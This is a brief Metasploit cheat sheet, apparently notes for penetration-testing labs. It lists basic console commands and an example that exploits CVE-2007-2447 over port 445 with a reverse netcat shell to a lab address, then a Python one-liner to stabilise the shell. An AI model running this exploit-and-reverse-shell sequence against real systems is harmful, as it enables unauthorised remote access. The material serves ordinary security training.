# Metasploit Framework
```
/usr/share/kali-menu/helper-scripts/metasploit-framework.sh
```

## Getting Help on Commands
```
msf6> help
```

## Searching for Exploits
```
msf6> search <term>
```

## Getting options
```
show options
```

## Common Commands
```
set RHOST <ip_address>
set LHOST <ip_address>
set RPORT <port_number>
set LPORT <port_number>
```

## Example
```
search CVE-2007-2447
use 0
set payload cmd/unix/reverse_netcat
set LHOST 10.10.14.12
set RHOST 10.10.10.3
set RPORT 445
```

## Shell Stabalization
```
python -c 'import pty; pty.spawn("bash")'
```